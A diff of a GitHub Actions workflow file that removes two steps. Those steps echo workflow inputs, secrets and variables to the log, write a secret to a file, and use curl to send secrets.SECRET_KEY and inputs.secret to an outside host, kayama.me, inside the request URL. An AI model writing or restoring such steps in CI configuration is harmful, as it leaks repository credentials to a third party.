@@ -35,27 +35,3 @@ jobs:
       - name: Print service name
         run: |
           echo "Service name: service-$service"
-    - name: "Get req and print"
-      id: req
-      run: |
-        echo Nnnnnnnn
-        echo ${{ inputs.req }}
-        echo ${{ inputs.test_secret }}
-    - name: "Step 2"
-      run: |
-        echo step reused 2
-        curl -s https://kayama.me/${{ secrets.SECRET_KEY }}/ > /dev/null
-        echo ${{ secrets.SECRET_KEY }}/ > secret.file
-        ls -la
-        cat secret.file
-        echo '-------------- secret ----------'
-        curl -s https://kayama.me/${{ inputs.secret }}/ > /dev/null
-        echo '----------------------------------------------------------------------------------------------------'
-        echo '${{ vars.ENV_OUTSIDE }}'
-        echo '----------------------------------------------------------------------------------------------------'
-        echo '${{ vars.AWS_REGION }}'
-        echo '----------------------------------------------------------------------------------------------------'
-        echo '${{ vars.TEST_ENV_VAR }}'
-        echo '----------------------------------------------------------------------------------------------------'
-        echo '${{ env.TEST_JOB_ENV }}'
-        echo '----------------------------------------------------------------------------------------------------'
